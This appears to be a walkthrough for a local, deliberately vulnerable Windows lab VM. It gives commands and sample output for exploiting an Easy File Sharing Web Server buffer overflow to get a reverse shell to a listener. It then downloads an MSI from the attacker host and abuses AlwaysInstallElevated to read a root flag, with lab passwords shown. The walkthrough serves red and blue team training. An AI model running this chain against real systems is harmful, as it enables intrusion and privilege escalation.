# CysVulnServer — validated walkthrough

End-to-end reproduction guide for the local QEMU build. All commands run inside `nix develop` unless noted.

**Goal:** capture `user.txt` and `root.txt` with printed evidence at each step.

Local QEMU uses host port forwards — adjust `--port` / `WINRM_PORT` if you changed defaults in [run-local-cysvuln.sh](../../scripts/run-local-cysvuln.sh).

| Role | Address |
|---|---|
| Target (HTTP) | `127.0.0.1:18080` |
| Target (WinRM) | `127.0.0.1:15985` |
| Attacker (QEMU gateway) | `10.0.2.2` from guest perspective |

---

## Phase 0 — Tooling

```bash
nix develop
./scripts/check-cysvuln-tooling.sh --default
```

Example output:

```
===== check-cysvuln-tooling (--default) =====
  PASS  packer  ...
  PASS  qemu-system-x86_64  ...
  PASS  python3  ...
  PASS  curl  ...
  PASS  nc  ...
  PASS  wixl  ...
  PASS  python3 -m winrm
  PASS  python3 -m keystone
-----------------------------------------
  8 pass / 0 fail
=========================================
```

---

## Phase 1 — Build and boot

### Build (or reuse artifact)

```bash
export SECRETCON_USER_FLAG='flag{cysvuln-user-local-test}'
export SECRETCON_ROOT_FLAG='flag{cysvuln-root-local-test}'
# nix build .#cysvuln-local   # requires Server 2016 ISO

ln -sf "$(readlink -f artifacts/cysvuln/local-qemu/cysvuln.qcow2)" result/cysvuln.qcow2
./scripts/run-local-cysvuln.sh
```

### Post-boot prep

If EFS is not listening yet:

```bash
WINRM_PORT=15985 ./scripts/cysvuln-local-prep.sh 127.0.0.1
```

Example output:

```
 Status StartType
 ------ ---------
Running Automatic
True
```

---

## Phase 2 — Reconnaissance

```bash
curl -sI http://127.0.0.1:18080/ | head -6
```

Example output:

```
HTTP/1.0 200 OK
Set-Cookie: SESSIONID=-1
Server: Easy File Sharing Web Server v6.9
Content-Type: text/html
Content-Length: 12447
Last-Modified: Fri, 11 May 2012 10:11:48 GMT
```

Optional (requires `nix develop .#kali`):

```bash
nmap -sV -p 80,5985 127.0.0.1
```

---

## Phase 3 — Configuration smoke test

```bash
WINRM_PORT=15985 ./scripts/verify-cysvuln.sh 127.0.0.1
```

Example output:

```
===== verify-cysvuln results =====
  PASS  winrm-port-open  tcp/15985
  PASS  aie-hklm  1
  PASS  uac-consent-prompt-zero  0
  PASS  uac-secure-desktop-zero  0
  PASS  user-joe-present
  PASS  user-flag-present  cysvuln-user-flag-placeholder
  PASS  root-flag-present  cysvuln-root-flag-placeholder
  PASS  fswsService-info  Running (informational)
  PASS  wazuh-agent-active  skipped (WAZUH_API_PASSWORD unset)
---------------------------------
  9 pass / 0 fail
=================================
```

---

## Phase 4b — Reduced validation (known Joe creds)

When you already have `User_Joe` / `VeryStrongPassword123!@#` from `Notes.txt`, prove AIE without the EFS foothold:

```bash
./scripts/validate-cysvuln-aie-joe.sh 127.0.0.1
```

This runs prep (option.ini, vfolders, PsExec, fresh probe MSI), smoke, audit, then `scripts/validate/run_aie_as_joe_interactive.py` (PsExec `-i` + optional RDP bootstrap on port `13389`).

Success criterion: `C:\Users\Public\aie-flag.txt` matches `root.txt`.

Example gate output:

```
===== validate-cysvuln-aie-joe =====
  5 pass / 0 fail

===== root flag cross-check =====
aie-flag: flag{cysvuln-root-local-test}
root.txt: flag{cysvuln-root-local-test}
[+] PASS: root flag matches aie-flag.txt
```

---

## Phase 4 — Foothold (EDB-42256)

`fswsService` runs as `User_Joe`. `Notes.txt` points at [EDB-42256](https://www.exploit-db.com/exploits/42256)
(HTTP POST `/sendemail.ghp`). The pinned box runs **EFS Web Server 6.9**; maintainer automation and
`check_efs69_response.py` implement the [EDB-37951](https://www.exploit-db.com/exploits/37951) USERID
cookie overflow (same `ImageLoad.dll` gadget family — see `scripts/validate/request_builder/rop.py`).

Trigger the USERID path with the in-repo PoC below.

### Callback shell (preferred)

Terminal A — listener:

```bash
nc -lvnp 4444
```

Terminal B — send exploit (guest reaches host at `10.0.2.2`):

```bash
python3 scripts/validate/check_efs69_response.py \
  --target 127.0.0.1 --port 18080 \
  --mode callback --lhost 10.0.2.2 --lport 4444
```

Example output:

```
[*] Listening on 0.0.0.0:4444
[*] Stimulus sent to 127.0.0.1:18080
[+] Inbound connection from ...
Microsoft Windows [Version 10.0.14393]
...
C:\Windows\SysWOW64>whoami
win-ub5q52138vg\user_joe
```

### Exec stager (non-interactive proof)

Commands cannot contain spaces (cookie constraint):

```bash
python3 scripts/validate/check_efs69_response.py \
  --target 127.0.0.1 --port 18080 --mode exec --cmd whoami
```

Example output:

```
[+] Exec stager sent to 127.0.0.1:18080
```

---

## Phase 5 — User flag

From the `User_Joe` shell:

```cmd
type C:\Users\User_Joe\Desktop\user.txt
```

Example output:

```
cysvuln-user-flag-placeholder
```

Side door: credentials are in `C:\Users\User_Joe\Desktop\Notes.txt`.

---

## Phase 6 — AlwaysInstallElevated enumeration

Repo-native audit (replaces SharpUp):

```bash
python3 scripts/validate/audit_aie.py \
  --target 127.0.0.1 --port 15985 \
  --user Administrator --password 'PizzaMan123!' \
  --profile-user User_Joe
```

Example output:

```
target  : 127.0.0.1
identity: WIN-UB5Q52138VG\Administrator
  AIE HKLM = 1                PASS
  AIE HKCU = 1                PASS
  AIE HKCU (User_Joe hive) = 1  PASS
  CPBA     = 0                PASS
  POSD     = 0                PASS
  msiexec  = C:\Windows\system32\msiexec.exe (v5.0.14393.0 ...)
  %TEMP%   = C:\Users\ADMINI~1\AppData\Local\Temp writable=True

AIE chain response expected: True
```

Manual check from the Joe shell:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must return `0x1`.

---

## Phase 6a — winPEAS enumeration (optional)

For the textbook PEAS-style enumeration view, drive winPEAS from the
attacker host:

```bash
./scripts/run-joe-tool.sh winpeas 127.0.0.1
```

The wrapper downloads `winPEASx64.exe` from the upstream peass-ng release,
stages it on a temporary local HTTP server, and runs it as `User_Joe` via a
one-shot scheduled task (`PsExec -u` / `Start-Process -Credential` fail
from a WinRM remote shell — see [winpeas.md](winpeas.md) for why). The
captured report is teed to `artifacts/cysvuln/winpeas-joe-<timestamp>.log`.

Headline findings (excerpt):

```
====== UAC Status (T1548.002)
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 1

====== Checking AlwaysInstallElevated (T1548.002)
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

====== Current Token privileges (T1134.001)
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
```

Full curated writeup: [winpeas.md](winpeas.md).

---

## Phase 6b — SharpUp enumeration (optional)

For GhostPack's focused C# privesc auditor (much shorter output, same
AIE headline):

```bash
./scripts/fetch-cysvuln-artifacts.sh   # warns if SharpUp.exe absent
./scripts/run-joe-tool.sh sharpup 127.0.0.1
```

Uses the same `joe_task_runner` harness as Phase 6a. SharpUp has no
upstream prebuilt releases, so the binary is **vendored** at
`infrastructure/artifacts/cysvuln/SharpUp.exe` (build instructions in
[sharpup.md](sharpup.md)).

Headline excerpt:

```
=== Always Install Elevated ===
	HKCU: 1
	HKLM: 1

=== Registry AutoLogons ===
	DefaultUserName: Administrator

=== Unattended Install Files ===
	C:\Windows\Panther\Unattend.xml

=== Services with Unquoted Paths ===
	Service 'fswsService' (StartMode: Automatic) has executable
	'C:\EFS Software\Easy File Sharing Web Server\fswsService.exe',
	but 'C:\EFS' is modifable.
```

Full curated writeup: [sharpup.md](sharpup.md).

---

## Phase 7 — Privilege escalation (MSI)

Generate a probe MSI on the attacker host (replaces msfvenom for validation):

```bash
python3 scripts/validate/check_aie_response.py \
  --command 'copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\aie-flag.txt' \
  --out /tmp/aie-probe.msi
```

Example output:

```
[+] MSI written: /tmp/aie-probe.msi  (10752 bytes)
```

Transfer to the victim (from Joe shell — start a host server first):

```bash
# attacker
python3 -m http.server 8888 --directory /tmp
```

```powershell
# victim (User_Joe)
Invoke-WebRequest -Uri 'http://10.0.2.2:8888/aie-probe.msi' -OutFile 'C:\Users\Public\aie-probe.msi'
```

Execute as **User_Joe** (interactive session — not a batch scheduled task):

```cmd
msiexec /quiet /norestart /i C:\Users\Public\aie-probe.msi /l*v C:\Users\Public\aie-probe.log
```

Verify elevation in the log:

```cmd
findstr /i "CustomActionSchedule Machine install SYSTEM" C:\Users\Public\aie-probe.log
```

Example line:

```
Executing op: CustomActionSchedule(Action=AieProbe,...,Source=C:\Windows\System32\cmd.exe,Target=/c copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\aie-flag.txt,)
```

---

## Phase 8 — Root flag

```cmd
type C:\Users\Public\aie-flag.txt
type C:\Users\Administrator\Desktop\root.txt
```

Example output:

```
cysvuln-root-flag-placeholder
```

---

## Goal checklist

| Goal | Command | Example evidence |
|---|---|---|
| Tooling ready | `check-cysvuln-tooling.sh --default` | 8 pass / 0 fail |
| EFS up | `curl -sI http://127.0.0.1:18080/` | `Server: Easy File Sharing Web Server v6.9` |
| Config valid | `verify-cysvuln.sh` | 9 pass / 0 fail |
| Foothold | `check_efs69_response.py --mode callback --service-port 80` | `whoami` → `user_joe` |
| User flag | `type user.txt` | `flag{cysvuln-user-local-test}` |
| AIE audit | `audit_aie.py --profile-user User_Joe` | `chain response expected: True` |
| winPEAS (optional) | `./scripts/run-joe-tool.sh winpeas 127.0.0.1` | `AlwaysInstallElevated set to 1 in HKLM!` / `... in HKCU!` |
| SharpUp (optional) | `./scripts/run-joe-tool.sh sharpup 127.0.0.1` | `=== Always Install Elevated ===  HKCU: 1  HKLM: 1` |
| Privesc | `msiexec /quiet /i aie-probe.msi` | CustomActionSchedule in log |
| msfvenom MSI (optional) | `nix develop .#kali; ./scripts/run-joe-tool.sh msfvenom-aie 127.0.0.1` | `aie-msfvenom-flag.txt == root.txt` |
| SIEM capture (blue team) | `./scripts/observability-loop.sh` | `summary.csv` + `msiexec-timeline.json` per iter (see [defend-faq-walkthrough.md](defend-faq-walkthrough.md)) |
| Baseline observability tour | `./scripts/observability/run-baseline-tour.sh` | Per-phase `matrix.md` + winPEAS/SharpUp/privesc SIEM slices (see [defend-faq-walkthrough.md](defend-faq-walkthrough.md)) |
| **10x stress campaign (red + blue)** | `./scripts/observability/stress-campaign.sh --iterations 10` | `campaign-summary.csv` + per-iter `red-scorecard.json` / `blue-scorecard.json` (see [defend-faq-walkthrough.md](defend-faq-walkthrough.md)) |
| EFS app log (Phase 4) | Wazuh archives filter `EFS Software` / rule `60602` on `fswsService.exe` crash | After `Savelog=1` + agent.conf tail; see baseline Phase 04 redo |
| Dataset export / Proxmox replay | `./scripts/wazuh-export-dataset.sh --run-id <id> --tarball` then `./scripts/wazuh-replay-to-proxmox.sh` | `dataset/MANIFEST.md`, `dataset.tar.zst` (see [runbooks/wazuh-dataset-export-and-replay.md](../runbooks/wazuh-dataset-export-and-replay.md)) |
| Root flag | `type root.txt` | `flag{cysvuln-root-local-test}` |

**Automated chain** (same player path, no scheduled tasks):

```bash
./scripts/validate-cysvuln-chain.sh 127.0.0.1
```

Example smoke + audit lines from `artifacts/cysvuln/validation-chain.log` (fresh build, 2026-05-24):

```
  PASS  user-flag-present  flag{cysvuln-user-local-test}
  PASS  root-flag-present  flag{cysvuln-root-local-test}
  9 pass / 0 fail
AIE chain response expected: True
```

**Why not schtasks?** Running `msiexec` via `schtasks` or `Start-Process -Credential` uses a non-interactive logon; Windows Installer returns **1601** (installer service access denied). AlwaysInstallElevated requires an interactive user session — use the EFS callback shell or RDP as `User_Joe`.

---

## Appendix — Kali-parity tooling

```bash
nix develop .#kali
./scripts/check-cysvuln-tooling.sh --kali
```

### msfvenom

Superseded by the [msfvenom.md](msfvenom.md) writeup —
`nix develop .#kali; ./scripts/run-joe-tool.sh msfvenom-aie 127.0.0.1` is the
end-to-end automated path (msfvenom build -> HTTP stage -> interactive
User_Joe -> flag cross-check).

### SharpUp

Superseded by [Phase 6b](#phase-6b--sharpup-enumeration-optional) and
[sharpup.md](sharpup.md) — `./scripts/run-joe-tool.sh sharpup 127.0.0.1` is the
automated path.
